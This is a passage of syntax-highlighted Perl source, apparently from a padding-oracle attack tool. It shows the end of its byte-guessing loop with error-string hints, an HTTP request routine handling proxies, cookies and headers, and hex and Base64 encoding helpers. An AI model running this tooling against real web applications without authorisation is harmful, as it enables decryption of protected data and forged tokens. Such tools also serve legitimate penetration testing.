							<span class="kw1">last</span> INNERLOOP<span class="sy0">;</span>                        
						<span class="br0">}</span>
&nbsp;
					<span class="br0">}</span>
				<span class="br0">}</span>
&nbsp;
				<span class="co1">## TODO: Combine these two blocks?</span>
				<span class="kw1">if</span> <span class="br0">(</span><span class="re0">$i</span> <span class="sy0">==</span> <span class="nu0">0</span> <span class="sy0">&amp;&amp;</span> <span class="re0">$analysisMode</span> <span class="sy0">==</span> <span class="nu0">1</span><span class="br0">)</span> <span class="br0">{</span>
					<span class="co1"># End of the road with no success.  We should probably try again.</span>
					<span class="re0">&amp;myPrint</span><span class="br0">(</span><span class="st0">"ERROR: No matching response on [Byte "</span><span class="sy0">.</span><span class="br0">(</span><span class="re0">$byteNum</span><span class="sy0">+</span><span class="nu0">1</span><span class="br0">)</span><span class="sy0">.</span><span class="st0">"]"</span><span class="sy0">,</span><span class="nu0">0</span><span class="br0">)</span><span class="sy0">;</span>
&nbsp;
					<span class="kw1">if</span> <span class="br0">(</span><span class="re0">$autoRetry</span> <span class="sy0">==</span> <span class="nu0">0</span><span class="br0">)</span> <span class="br0">{</span>
						<span class="re0">$autoRetry</span> <span class="sy0">=</span> <span class="nu0">1</span><span class="sy0">;</span>
						<span class="re0">&amp;myPrint</span><span class="br0">(</span><span class="st0">"       Automatically trying one more time..."</span><span class="sy0">,</span><span class="nu0">0</span><span class="br0">)</span><span class="sy0">;</span>
						<span class="re0">$repeat</span> <span class="sy0">=</span> <span class="nu0">1</span><span class="sy0">;</span>
						<span class="kw1">last</span> OUTERLOOP<span class="sy0">;</span>
&nbsp;
					<span class="br0">}</span> <span class="kw1">else</span> <span class="br0">{</span>
						<span class="kw1">if</span> <span class="br0">(</span><span class="br0">(</span><span class="re0">$byteNum</span> <span class="sy0">==</span> <span class="re0">$blockSize</span> <span class="sy0">-</span> <span class="nu0">1</span><span class="br0">)</span> <span class="sy0">&amp;&amp;</span> <span class="br0">(</span><span class="re0">$error</span><span class="br0">)</span><span class="br0">)</span> <span class="br0">{</span>
							<span class="re0">&amp;myPrint</span><span class="br0">(</span><span class="st0">"<span class="es0">\n</span>Are you sure you specified the correct error string?"</span><span class="sy0">,</span><span class="nu0">0</span><span class="br0">)</span><span class="sy0">;</span>
							<span class="re0">&amp;myPrint</span><span class="br0">(</span><span class="st0">"Try re-running without the -e option to perform a response analysis.<span class="es0">\n</span>"</span><span class="sy0">,</span><span class="nu0">0</span><span class="br0">)</span><span class="sy0">;</span>
						<span class="br0">}</span> 
&nbsp;
						<span class="re0">$continue</span> <span class="sy0">=</span> <span class="re0">&amp;promptUser</span><span class="br0">(</span><span class="st0">"Do you want to start this block over? (Yes/No)? [y/n/a]"</span><span class="sy0">,</span><span class="st0">""</span><span class="sy0">,</span><span class="nu0">1</span><span class="br0">)</span><span class="sy0">;</span>
						<span class="kw1">if</span> <span class="br0">(</span><span class="re0">$continue</span> <span class="kw1">ne</span> <span class="st0">"n"</span><span class="br0">)</span> <span class="br0">{</span>
							<span class="re0">&amp;myPrint</span><span class="br0">(</span><span class="st0">"INFO: Switching to interactive mode"</span><span class="sy0">,</span><span class="nu0">0</span><span class="br0">)</span><span class="sy0">;</span>
							<span class="re0">$interactive</span> <span class="sy0">=</span> <span class="nu0">1</span><span class="sy0">;</span>
							<span class="re0">$repeat</span> <span class="sy0">=</span> <span class="nu0">1</span><span class="sy0">;</span>
							<span class="kw1">last</span> OUTERLOOP<span class="sy0">;</span>
						<span class="br0">}</span>					
					<span class="br0">}</span>
				<span class="br0">}</span>   
				<span class="kw1">if</span> <span class="br0">(</span><span class="re0">$falsePositiveDetector</span> <span class="sy0">==</span> <span class="re0">$blockSize</span><span class="br0">)</span> <span class="br0">{</span>
					<span class="re0">&amp;myPrint</span><span class="br0">(</span><span class="st0">"<span class="es0">\n</span>*** ERROR: It appears there are false positive results. ***<span class="es0">\n</span>"</span><span class="sy0">,</span><span class="nu0">0</span><span class="br0">)</span><span class="sy0">;</span>
					<span class="re0">&amp;myPrint</span><span class="br0">(</span><span class="st0">"HINT: The most likely cause for this is an incorrect error string.<span class="es0">\n</span>"</span><span class="sy0">,</span><span class="nu0">0</span><span class="br0">)</span><span class="sy0">;</span>
					<span class="kw1">if</span> <span class="br0">(</span><span class="re0">$error</span><span class="br0">)</span> <span class="br0">{</span>
						<span class="re0">&amp;myPrint</span><span class="br0">(</span><span class="st0">"[+] Check the error string you provided and try again, or consider running"</span><span class="sy0">,</span><span class="nu0">0</span><span class="br0">)</span><span class="sy0">;</span>
						<span class="re0">&amp;myPrint</span><span class="br0">(</span><span class="st0">"[+] without an error string to perform an automated response analysis.<span class="es0">\n</span>"</span><span class="sy0">,</span><span class="nu0">0</span><span class="br0">)</span><span class="sy0">;</span>
					<span class="br0">}</span> <span class="kw1">else</span> <span class="br0">{</span>
						<span class="re0">&amp;myPrint</span><span class="br0">(</span><span class="st0">"[+] You may want to consider defining a custom padding error string"</span><span class="sy0">,</span><span class="nu0">0</span><span class="br0">)</span><span class="sy0">;</span>
						<span class="re0">&amp;myPrint</span><span class="br0">(</span><span class="st0">"[+] instead of the automated response analysis.<span class="es0">\n</span>"</span><span class="sy0">,</span><span class="nu0">0</span><span class="br0">)</span><span class="sy0">;</span>
					<span class="br0">}</span>
					<span class="re0">$continue</span> <span class="sy0">=</span> <span class="re0">&amp;promptUser</span><span class="br0">(</span><span class="st0">"Do you want to start this block over? (Yes/No)? [y/n/a]"</span><span class="sy0">,</span><span class="st0">""</span><span class="sy0">,</span><span class="nu0">1</span><span class="br0">)</span><span class="sy0">;</span>
					<span class="kw1">if</span> <span class="br0">(</span><span class="re0">$continue</span> <span class="kw1">eq</span> <span class="st0">"y"</span><span class="br0">)</span> <span class="br0">{</span>
						<span class="re0">&amp;myPrint</span><span class="br0">(</span><span class="st0">"INFO: Switching to interactive mode"</span><span class="sy0">,</span><span class="nu0">0</span><span class="br0">)</span><span class="sy0">;</span>
						<span class="re0">$interactive</span> <span class="sy0">=</span> <span class="nu0">1</span><span class="sy0">;</span>
						<span class="re0">$repeat</span> <span class="sy0">=</span> <span class="nu0">1</span><span class="sy0">;</span>
						<span class="kw1">last</span> OUTERLOOP<span class="sy0">;</span>
					<span class="br0">}</span>
				<span class="br0">}</span>
			<span class="br0">}</span> 
		<span class="br0">}</span>
		<span class="br0">(</span><span class="re0">$repeat</span> <span class="sy0">==</span> <span class="nu0">1</span><span class="br0">)</span> <span class="sy0">?</span> <span class="br0">(</span><span class="re0">$complete</span> <span class="sy0">=</span> <span class="nu0">0</span><span class="br0">)</span> <span class="sy0">:</span> <span class="br0">(</span><span class="re0">$complete</span> <span class="sy0">=</span> <span class="nu0">1</span><span class="br0">)</span><span class="sy0">;</span>
	<span class="br0">}</span>
	<a href="https://web.archive.org/web/20160629065624/http://perldoc.perl.org/functions/return.html"><span class="kw3">return</span></a> <span class="re0">$returnValue</span><span class="sy0">;</span>
<span class="br0">}</span>
&nbsp;
<span class="kw2">sub</span> makeRequest <span class="br0">{</span>
&nbsp;
 <span class="kw1">my</span> <span class="br0">(</span><span class="re0">$method</span><span class="sy0">,</span> <span class="re0">$url</span><span class="sy0">,</span> <span class="re0">$data</span><span class="sy0">,</span> <span class="re0">$cookie</span><span class="br0">)</span> <span class="sy0">=</span> <span class="co5">@_</span><span class="sy0">;</span> 
 <span class="kw1">my</span> <span class="br0">(</span><span class="re0">$noConnect</span><span class="sy0">,</span> <span class="re0">$lwp</span><span class="sy0">,</span> <span class="re0">$status</span><span class="sy0">,</span> <span class="re0">$content</span><span class="sy0">,</span> <span class="re0">$req</span><span class="sy0">,</span> <span class="re0">$location</span><span class="sy0">,</span> <span class="re0">$contentLength</span><span class="br0">)</span><span class="sy0">;</span>   
 <span class="kw1">my</span> <span class="re0">$numRetries</span> <span class="sy0">=</span> <span class="nu0">0</span><span class="sy0">;</span>
 <span class="re0">$data</span> <span class="sy0">=</span><span class="st_h">''</span> <span class="kw1">unless</span> <span class="re0">$data</span><span class="sy0">;</span>
 <span class="re0">$cookie</span><span class="sy0">=</span><span class="st_h">''</span> <span class="kw1">unless</span> <span class="re0">$cookie</span><span class="sy0">;</span>
&nbsp;
 <span class="re0">$requestTracker</span><span class="sy0">++;</span>
 <span class="kw1">do</span> <span class="br0">{</span>
  <span class="co1">#Quick hack to avoid hostname in URL when using a proxy with SSL (this will get re-set later if needed)</span>
  <span class="re0">$ENV</span><span class="br0">{</span>HTTPS_PROXY<span class="br0">}</span> <span class="sy0">=</span> <span class="st0">""</span><span class="sy0">;</span>
&nbsp;
  <span class="re0">$lwp</span> <span class="sy0">=</span> LWP<span class="sy0">::</span><span class="me2">UserAgent</span><span class="sy0">-&gt;</span><span class="kw2">new</span><span class="br0">(</span>env_proxy <span class="sy0">=&gt;</span> <span class="nu0">1</span><span class="sy0">,</span>
                            keep_alive <span class="sy0">=&gt;</span> <span class="nu0">1</span><span class="sy0">,</span>
                            timeout <span class="sy0">=&gt;</span> <span class="nu0">30</span><span class="sy0">,</span>
			    requests_redirectable <span class="sy0">=&gt;</span> <span class="br0">[</span><span class="br0">]</span><span class="sy0">,</span>
                            <span class="br0">)</span><span class="sy0">;</span>
&nbsp;
  <span class="re0">$req</span> <span class="sy0">=</span> <span class="kw2">new</span> HTTP<span class="sy0">::</span><span class="me2">Request</span> <span class="re0">$method</span> <span class="sy0">=&gt;</span> <span class="re0">$url</span><span class="sy0">;</span>
&nbsp;
  <span class="re0">&amp;myPrint</span><span class="br0">(</span><span class="st0">"Request:<span class="es0">\n</span>$method<span class="es0">\n</span>$url<span class="es0">\n</span>$data<span class="es0">\n</span>$cookie"</span><span class="sy0">,</span><span class="nu0">0</span><span class="br0">)</span> <span class="kw1">if</span> <span class="re0">$superVerbose</span><span class="sy0">;</span>
&nbsp;
  <span class="co1"># Add request content for POST and PUTS </span>
  <span class="kw1">if</span> <span class="br0">(</span><span class="re0">$data</span><span class="br0">)</span> <span class="br0">{</span>
   <span class="re0">$req</span><span class="sy0">-&gt;</span><span class="me1">content_type</span><span class="br0">(</span><span class="st_h">'application/x-www-form-urlencoded'</span><span class="br0">)</span><span class="sy0">;</span>
   <span class="re0">$req</span><span class="sy0">-&gt;</span><span class="me1">content</span><span class="br0">(</span><span class="re0">$data</span><span class="br0">)</span><span class="sy0">;</span>
  <span class="br0">}</span>
&nbsp;
  <span class="kw1">if</span> <span class="br0">(</span><span class="re0">$proxy</span><span class="br0">)</span> <span class="br0">{</span>
  	<span class="kw1">my</span> <span class="re0">$proxyUrl</span> <span class="sy0">=</span> <span class="st0">"http://"</span><span class="sy0">;</span>
  	<span class="kw1">if</span> <span class="br0">(</span><span class="re0">$proxyAuth</span><span class="br0">)</span> <span class="br0">{</span>
 		<span class="kw1">my</span> <span class="br0">(</span><span class="re0">$proxyUser</span><span class="sy0">,</span> <span class="re0">$proxyPass</span><span class="br0">)</span> <span class="sy0">=</span> <a href="https://web.archive.org/web/20160629065624/http://perldoc.perl.org/functions/split.html"><span class="kw3">split</span></a><span class="br0">(</span><span class="st0">":"</span><span class="sy0">,</span><span class="re0">$proxyAuth</span><span class="br0">)</span><span class="sy0">;</span>
 		<span class="re0">$ENV</span><span class="br0">{</span>HTTPS_PROXY_USERNAME<span class="br0">}</span>	<span class="sy0">=</span> <span class="re0">$proxyUser</span><span class="sy0">;</span>
		<span class="re0">$ENV</span><span class="br0">{</span>HTTPS_PROXY_PASSWORD<span class="br0">}</span>	<span class="sy0">=</span> <span class="re0">$proxyPass</span><span class="sy0">;</span>
		<span class="re0">$proxyUrl</span> <span class="sy0">.=</span> <span class="re0">$proxyAuth</span><span class="sy0">.</span><span class="st0">"@"</span><span class="sy0">;</span>
 	<span class="br0">}</span>
 	<span class="re0">$proxyUrl</span> <span class="sy0">.=</span> <span class="re0">$proxy</span><span class="sy0">;</span>
 	<span class="re0">$lwp</span><span class="sy0">-&gt;</span><span class="me1">proxy</span><span class="br0">(</span><span class="br0">[</span><span class="st_h">'http'</span><span class="br0">]</span><span class="sy0">,</span> <span class="st0">"http://"</span><span class="sy0">.</span><span class="re0">$proxy</span><span class="br0">)</span><span class="sy0">;</span>
	<span class="re0">$ENV</span><span class="br0">{</span>HTTPS_PROXY<span class="br0">}</span> <span class="sy0">=</span> <span class="st0">"http://"</span><span class="sy0">.</span><span class="re0">$proxy</span><span class="sy0">;</span>
  <span class="br0">}</span> 	
&nbsp;
&nbsp;
  <span class="kw1">if</span> <span class="br0">(</span><span class="re0">$auth</span><span class="br0">)</span> <span class="br0">{</span>
   <span class="kw1">my</span> <span class="br0">(</span><span class="re0">$httpuser</span><span class="sy0">,</span> <span class="re0">$httppass</span><span class="br0">)</span> <span class="sy0">=</span> <a href="https://web.archive.org/web/20160629065624/http://perldoc.perl.org/functions/split.html"><span class="kw3">split</span></a><span class="br0">(</span><span class="co2">/:/</span><span class="sy0">,</span><span class="re0">$auth</span><span class="br0">)</span><span class="sy0">;</span>
   <span class="re0">$req</span><span class="sy0">-&gt;</span><span class="me1">authorization_basic</span><span class="br0">(</span><span class="re0">$httpuser</span><span class="sy0">,</span> <span class="re0">$httppass</span><span class="br0">)</span><span class="sy0">;</span>
  <span class="br0">}</span>
&nbsp;
  <span class="co1"># If cookies are defined, add a COOKIE header</span>
  <span class="kw1">if</span> <span class="br0">(</span><span class="sy0">!</span> <span class="re0">$cookie</span> <span class="kw1">eq</span> <span class="st0">""</span><span class="br0">)</span> <span class="br0">{</span>
   <span class="re0">$req</span><span class="sy0">-&gt;</span><span class="me1">header</span><span class="br0">(</span>Cookie <span class="sy0">=&gt;</span> <span class="re0">$cookie</span><span class="br0">)</span><span class="sy0">;</span>
  <span class="br0">}</span>
&nbsp;
  <span class="kw1">if</span> <span class="br0">(</span><span class="re0">$headers</span><span class="br0">)</span> <span class="br0">{</span>
   <span class="kw1">my</span> <span class="re0">@customHeaders</span> <span class="sy0">=</span> <a href="https://web.archive.org/web/20160629065624/http://perldoc.perl.org/functions/split.html"><span class="kw3">split</span></a><span class="br0">(</span><span class="co2">/;/i</span><span class="sy0">,</span><span class="re0">$headers</span><span class="br0">)</span><span class="sy0">;</span>
   <span class="kw1">for</span> <span class="br0">(</span><span class="kw1">my</span> <span class="re0">$i</span> <span class="sy0">=</span> <span class="nu0">0</span><span class="sy0">;</span> <span class="re0">$i</span> <span class="sy0">&lt;=</span> <span class="re0">$#customHeaders</span><span class="sy0">;</span> <span class="re0">$i</span><span class="sy0">++</span><span class="br0">)</span> <span class="br0">{</span>
    <span class="kw1">my</span> <span class="br0">(</span><span class="re0">$headerName</span><span class="sy0">,</span> <span class="re0">$headerVal</span><span class="br0">)</span> <span class="sy0">=</span> <a href="https://web.archive.org/web/20160629065624/http://perldoc.perl.org/functions/split.html"><span class="kw3">split</span></a><span class="br0">(</span><span class="co2">/\::/i</span><span class="sy0">,</span><span class="re0">$customHeaders</span><span class="br0">[</span><span class="re0">$i</span><span class="br0">]</span><span class="br0">)</span><span class="sy0">;</span>
    <span class="re0">$req</span><span class="sy0">-&gt;</span><span class="me1">header</span><span class="br0">(</span><span class="re0">$headerName</span><span class="sy0">,</span> <span class="re0">$headerVal</span><span class="br0">)</span><span class="sy0">;</span>
   <span class="br0">}</span>
  <span class="br0">}</span>
&nbsp;
  <span class="kw1">my</span> <span class="re0">$startTime</span> <span class="sy0">=</span> <span class="re0">&amp;gettimeofday</span><span class="br0">(</span><span class="br0">)</span><span class="sy0">;</span>
  <span class="kw1">my</span> <span class="re0">$response</span> <span class="sy0">=</span> <span class="re0">$lwp</span><span class="sy0">-&gt;</span><span class="me1">request</span><span class="br0">(</span><span class="re0">$req</span><span class="br0">)</span><span class="sy0">;</span>
  <span class="kw1">my</span> <span class="re0">$endTime</span> <span class="sy0">=</span> <span class="re0">&amp;gettimeofday</span><span class="br0">(</span><span class="br0">)</span><span class="sy0">;</span>  
  <span class="re0">$timeTracker</span> <span class="sy0">=</span> <span class="re0">$timeTracker</span> <span class="sy0">+</span> <span class="br0">(</span><span class="re0">$endTime</span> <span class="sy0">-</span> <span class="re0">$startTime</span><span class="br0">)</span><span class="sy0">;</span>
&nbsp;
  <span class="kw1">if</span> <span class="br0">(</span><span class="re0">$printStats</span> <span class="sy0">==</span> <span class="nu0">1</span> <span class="sy0">&amp;&amp;</span> <span class="re0">$requestTracker</span> <span class="sy0">%</span> <span class="nu0">250</span> <span class="sy0">==</span> <span class="nu0">0</span><span class="br0">)</span> <span class="br0">{</span>
  	<a href="https://web.archive.org/web/20160629065624/http://perldoc.perl.org/functions/print.html"><span class="kw3">print</span></a> <span class="st0">"[+] $requestTracker Requests Issued (Avg Request Time: "</span><span class="sy0">.</span><span class="br0">(</span><a href="https://web.archive.org/web/20160629065624/http://perldoc.perl.org/functions/sprintf.html"><span class="kw3">sprintf</span></a> <span class="st0">"%.3f"</span><span class="sy0">,</span> <span class="re0">$timeTracker</span><span class="sy0">/</span><span class="nu0">100</span><span class="br0">)</span><span class="sy0">.</span><span class="st0">")<span class="es0">\n</span>"</span><span class="sy0">;</span>
  	<span class="re0">$timeTracker</span> <span class="sy0">=</span> <span class="nu0">0</span><span class="sy0">;</span>
  <span class="br0">}</span>
&nbsp;
&nbsp;
  <span class="co1"># Extract the required attributes from the response</span>
  <span class="re0">$status</span> <span class="sy0">=</span> <a href="https://web.archive.org/web/20160629065624/http://perldoc.perl.org/functions/substr.html"><span class="kw3">substr</span></a><span class="br0">(</span><span class="re0">$response</span><span class="sy0">-&gt;</span><span class="me1">status_line</span><span class="sy0">,</span> <span class="nu0">0</span><span class="sy0">,</span> <span class="nu0">3</span><span class="br0">)</span><span class="sy0">;</span>
  <span class="re0">$content</span> <span class="sy0">=</span> <span class="re0">$response</span><span class="sy0">-&gt;</span><span class="me1">content</span><span class="sy0">;</span>
&nbsp;
  <span class="re0">&amp;myPrint</span><span class="br0">(</span><span class="st0">"Response Content:<span class="es0">\n</span>$content"</span><span class="sy0">,</span><span class="nu0">0</span><span class="br0">)</span> <span class="kw1">if</span> <span class="re0">$superVerbose</span><span class="sy0">;</span>
  <span class="re0">$location</span> <span class="sy0">=</span> <span class="re0">$response</span><span class="sy0">-&gt;</span><span class="me1">header</span><span class="br0">(</span><span class="st0">"Location"</span><span class="br0">)</span><span class="sy0">;</span>
  <span class="kw1">if</span> <span class="br0">(</span><span class="sy0">!</span><span class="re0">$location</span><span class="br0">)</span>   <span class="br0">{</span>
   <span class="re0">$location</span> <span class="sy0">=</span> <span class="st0">"N/A"</span><span class="sy0">;</span>
  <span class="br0">}</span>
  <span class="co1">#$contentLength = $response-&gt;header("Content-Length");</span>
  <span class="re0">$contentLength</span> <span class="sy0">=</span> <a href="https://web.archive.org/web/20160629065624/http://perldoc.perl.org/functions/length.html"><span class="kw3">length</span></a><span class="br0">(</span><span class="re0">$content</span><span class="br0">)</span><span class="sy0">;</span>
&nbsp;
&nbsp;
  <span class="kw1">my</span> <span class="re0">$contentEncoding</span> <span class="sy0">=</span> <span class="re0">$response</span><span class="sy0">-&gt;</span><span class="me1">header</span><span class="br0">(</span><span class="st0">"Content-Encoding"</span><span class="br0">)</span><span class="sy0">;</span>
  <span class="kw1">if</span> <span class="br0">(</span><span class="re0">$contentEncoding</span><span class="br0">)</span> <span class="br0">{</span>
   <span class="kw1">if</span> <span class="br0">(</span><span class="re0">$contentEncoding</span> <span class="sy0">=~</span> <span class="co2">/GZIP/i</span> <span class="br0">)</span> <span class="br0">{</span>
    	<span class="re0">$content</span> <span class="sy0">=</span> Compress<span class="sy0">::</span><span class="me2">Zlib</span><span class="sy0">::</span><span class="me2">memGunzip</span><span class="br0">(</span><span class="re0">$content</span><span class="br0">)</span><span class="sy0">;</span>
  	<span class="re0">$contentLength</span> <span class="sy0">=</span> <a href="https://web.archive.org/web/20160629065624/http://perldoc.perl.org/functions/length.html"><span class="kw3">length</span></a><span class="br0">(</span><span class="re0">$content</span><span class="br0">)</span><span class="sy0">;</span>
   <span class="br0">}</span>
  <span class="br0">}</span>
&nbsp;
  <span class="kw1">my</span> <span class="re0">$statusMsg</span> <span class="sy0">=</span> <span class="re0">$response</span><span class="sy0">-&gt;</span><span class="me1">status_line</span><span class="sy0">;</span>
  <span class="co1">#myPrint("Status: $statusMsg, Location: $location, Length: $contentLength",1); </span>
&nbsp;
  <span class="kw1">if</span> <span class="br0">(</span><span class="re0">$statusMsg</span> <span class="sy0">=~</span> <span class="co2">/Can't connect/</span><span class="br0">)</span> <span class="br0">{</span>
   <a href="https://web.archive.org/web/20160629065624/http://perldoc.perl.org/functions/print.html"><span class="kw3">print</span></a> <span class="st0">"ERROR: $statusMsg<span class="es0">\n</span>   Retrying in 10 seconds...<span class="es0">\n</span><span class="es0">\n</span>"</span><span class="sy0">;</span>
   <span class="re0">$noConnect</span> <span class="sy0">=</span> <span class="nu0">1</span><span class="sy0">;</span>
   <span class="re0">$numRetries</span><span class="sy0">++;</span>
   <a href="https://web.archive.org/web/20160629065624/http://perldoc.perl.org/functions/sleep.html"><span class="kw3">sleep</span></a> <span class="nu0">10</span><span class="sy0">;</span>
  <span class="br0">}</span> <span class="kw1">else</span> <span class="br0">{</span>
   <span class="re0">$noConnect</span> <span class="sy0">=</span> <span class="nu0">0</span><span class="sy0">;</span>
   <span class="re0">$totalRequests</span><span class="sy0">++;</span>
  <span class="br0">}</span>  
 <span class="br0">}</span> <span class="kw1">until</span> <span class="br0">(</span><span class="br0">(</span><span class="re0">$noConnect</span> <span class="sy0">==</span> <span class="nu0">0</span><span class="br0">)</span> <span class="sy0">||</span> <span class="br0">(</span><span class="re0">$numRetries</span> <span class="sy0">&gt;=</span> <span class="nu0">15</span><span class="br0">)</span><span class="br0">)</span><span class="sy0">;</span>
 <span class="kw1">if</span> <span class="br0">(</span><span class="re0">$numRetries</span> <span class="sy0">&gt;=</span> <span class="nu0">15</span><span class="br0">)</span> <span class="br0">{</span>
  <span class="re0">&amp;myPrint</span><span class="br0">(</span><span class="st0">"ERROR: Number of retries has exceeded 15 attempts...quitting.<span class="es0">\n</span>"</span><span class="sy0">,</span><span class="nu0">0</span><span class="br0">)</span><span class="sy0">;</span>
  <a href="https://web.archive.org/web/20160629065624/http://perldoc.perl.org/functions/exit.html"><span class="kw3">exit</span></a><span class="sy0">;</span>
 <span class="br0">}</span>
 <a href="https://web.archive.org/web/20160629065624/http://perldoc.perl.org/functions/return.html"><span class="kw3">return</span></a> <span class="br0">(</span><span class="re0">$status</span><span class="sy0">,</span> <span class="re0">$content</span><span class="sy0">,</span> <span class="re0">$location</span><span class="sy0">,</span> <span class="re0">$contentLength</span><span class="br0">)</span><span class="sy0">;</span>
<span class="br0">}</span>
&nbsp;
<span class="kw2">sub</span> myPrint <span class="br0">{</span>
 <span class="kw1">my</span> <span class="br0">(</span><span class="re0">$printData</span><span class="sy0">,</span> <span class="re0">$printLevel</span><span class="br0">)</span> <span class="sy0">=</span> <span class="co5">@_</span><span class="sy0">;</span>
 <span class="re0">$printData</span> <span class="sy0">.=</span> <span class="st0">"<span class="es0">\n</span>"</span><span class="sy0">;</span>
 <span class="kw1">if</span> <span class="br0">(</span><span class="br0">(</span><span class="re0">$verbose</span> <span class="sy0">&amp;&amp;</span> <span class="re0">$printLevel</span> <span class="sy0">&gt;</span> <span class="nu0">0</span><span class="br0">)</span> <span class="sy0">||</span> <span class="re0">$printLevel</span> <span class="sy0">&lt;</span> <span class="nu0">1</span> <span class="sy0">||</span> <span class="re0">$superVerbose</span><span class="br0">)</span> <span class="br0">{</span>
  <a href="https://web.archive.org/web/20160629065624/http://perldoc.perl.org/functions/print.html"><span class="kw3">print</span></a> <span class="re0">$printData</span><span class="sy0">;</span>
  <span class="re0">&amp;writeFile</span><span class="br0">(</span><span class="st0">"ActivityLog.txt"</span><span class="sy0">,</span><span class="re0">$printData</span><span class="br0">)</span><span class="sy0">;</span>
 <span class="br0">}</span>
<span class="br0">}</span>
&nbsp;
<span class="kw2">sub</span> myEncode <span class="br0">{</span>
 <span class="kw1">my</span> <span class="br0">(</span><span class="re0">$toEncode</span><span class="sy0">,</span> <span class="re0">$format</span><span class="br0">)</span> <span class="sy0">=</span> <span class="co5">@_</span><span class="sy0">;</span>
 <a href="https://web.archive.org/web/20160629065624/http://perldoc.perl.org/functions/return.html"><span class="kw3">return</span></a> <span class="re0">&amp;encodeDecode</span><span class="br0">(</span><span class="re0">$toEncode</span><span class="sy0">,</span> <span class="nu0">0</span><span class="sy0">,</span> <span class="re0">$format</span><span class="br0">)</span><span class="sy0">;</span>
<span class="br0">}</span>
&nbsp;
<span class="kw2">sub</span> myDecode <span class="br0">{</span>
 <span class="kw1">my</span> <span class="br0">(</span><span class="re0">$toDecode</span><span class="sy0">,</span> <span class="re0">$format</span><span class="br0">)</span> <span class="sy0">=</span> <span class="co5">@_</span><span class="sy0">;</span>
 <a href="https://web.archive.org/web/20160629065624/http://perldoc.perl.org/functions/return.html"><span class="kw3">return</span></a> <span class="re0">&amp;encodeDecode</span><span class="br0">(</span><span class="re0">$toDecode</span><span class="sy0">,</span> <span class="nu0">1</span><span class="sy0">,</span> <span class="re0">$format</span><span class="br0">)</span><span class="sy0">;</span>
<span class="br0">}</span>
&nbsp;
<span class="kw2">sub</span> encodeDecode <span class="br0">{</span>
 <span class="kw1">my</span> <span class="br0">(</span><span class="re0">$toEncodeDecode</span><span class="sy0">,</span> <span class="re0">$oper</span><span class="sy0">,</span> <span class="re0">$format</span><span class="br0">)</span> <span class="sy0">=</span> <span class="co5">@_</span><span class="sy0">;</span>
 <span class="co1"># Oper: 0=Encode, 1=Decode</span>
 <span class="co1"># Format: 0=Base64, 1 Hex Lower, 2 Hex Upper, 3=NetUrlToken</span>
 <span class="kw1">my</span> <span class="re0">$returnVal</span> <span class="sy0">=</span> <span class="st0">""</span><span class="sy0">;</span>
 <span class="kw1">if</span> <span class="br0">(</span><span class="re0">$format</span> <span class="sy0">==</span> <span class="nu0">1</span> <span class="sy0">||</span> <span class="re0">$format</span> <span class="sy0">==</span> <span class="nu0">2</span><span class="br0">)</span> <span class="br0">{</span>
   <span class="co1"># HEX</span>
   <span class="kw1">if</span> <span class="br0">(</span><span class="re0">$oper</span> <span class="sy0">==</span> <span class="nu0">1</span><span class="br0">)</span> <span class="br0">{</span>
   	<span class="co1">#Decode</span>
   	<span class="co1">#Always convert to lower when decoding)</span>
   	<span class="re0">$toEncodeDecode</span> <span class="sy0">=</span> <a href="https://web.archive.org/web/20160629065624/http://perldoc.perl.org/functions/lc.html"><span class="kw3">lc</span></a><span class="br0">(</span><span class="re0">$toEncodeDecode</span><span class="br0">)</span><span class="sy0">;</span>
	<span class="re0">$returnVal</span> <span class="sy0">=</span> <a href="https://web.archive.org/web/20160629065624/http://perldoc.perl.org/functions/pack.html"><span class="kw3">pack</span></a><span class="br0">(</span><span class="st0">"H*"</span><span class="sy0">,</span><span class="re0">$toEncodeDecode</span><span class="br0">)</span><span class="sy0">;</span>
   <span class="br0">}</span> <span class="kw1">else</span> <span class="br0">{</span>
   	<span class="co1">#Encode</span>
	<span class="re0">$returnVal</span> <span class="sy0">=</span> <a href="https://web.archive.org/web/20160629065624/http://perldoc.perl.org/functions/unpack.html"><span class="kw3">unpack</span></a><span class="br0">(</span><span class="st0">"H*"</span><span class="sy0">,</span><span class="re0">$toEncodeDecode</span><span class="br0">)</span><span class="sy0">;</span>
	<span class="kw1">if</span> <span class="br0">(</span><span class="re0">$format</span> <span class="sy0">==</span> <span class="nu0">2</span><span class="br0">)</span> <span class="br0">{</span>
	   	<span class="co1">#Uppercase</span>
		<span class="re0">$returnVal</span> <span class="sy0">=</span> <a href="https://web.archive.org/web/20160629065624/http://perldoc.perl.org/functions/uc.html"><span class="kw3">uc</span></a><span class="br0">(</span><span class="re0">$returnVal</span><span class="br0">)</span>
   	<span class="br0">}</span>
   <span class="br0">}</span>
 <span class="br0">}</span> <span class="kw1">elsif</span> <span class="br0">(</span><span class="re0">$format</span> <span class="sy0">==</span> <span class="nu0">3</span><span class="br0">)</span> <span class="br0">{</span>
   <span class="co1"># NetUrlToken</span>
   <span class="kw1">if</span> <span class="br0">(</span><span class="re0">$oper</span> <span class="sy0">==</span> <span class="nu0">1</span><span class="br0">)</span> <span class="br0">{</span>
	<span class="re0">$returnVal</span> <span class="sy0">=</span> <span class="re0">&amp;web64Decode</span><span class="br0">(</span><span class="re0">$toEncodeDecode</span><span class="sy0">,</span><span class="nu0">1</span><span class="br0">)</span><span class="sy0">;</span>
   <span class="br0">}</span> <span class="kw1">else</span> <span class="br0">{</span>
	<span class="re0">$returnVal</span> <span class="sy0">=</span> <span class="re0">&amp;web64Encode</span><span class="br0">(</span><span class="re0">$toEncodeDecode</span><span class="sy0">,</span><span class="nu0">1</span><span class="br0">)</span><span class="sy0">;</span>
   <span class="br0">}</span> 
 <span class="br0">}</span> <span class="kw1">elsif</span> <span class="br0">(</span><span class="re0">$format</span> <span class="sy0">==</span> <span class="nu0">4</span><span class="br0">)</span> <span class="br0">{</span>
    <span class="co1"># Web64</span>
    <span class="kw1">if</span> <span class="br0">(</span><span class="re0">$oper</span> <span class="sy0">==</span> <span class="nu0">1</span><span class="br0">)</span> <span class="br0">{</span>
 	<span class="re0">$returnVal</span> <span class="sy0">=</span> <span class="re0">&amp;web64Decode</span><span class="br0">(</span><span class="re0">$toEncodeDecode</span><span class="sy0">,</span><span class="nu0">0</span><span class="br0">)</span><span class="sy0">;</span>
    <span class="br0">}</span> <span class="kw1">else</span> <span class="br0">{</span>
 	<span class="re0">$returnVal</span> <span class="sy0">=</span> <span class="re0">&amp;web64Encode</span><span class="br0">(</span><span class="re0">$toEncodeDecode</span><span class="sy0">,</span><span class="nu0">0</span><span class="br0">)</span><span class="sy0">;</span>
    <span class="br0">}</span> 
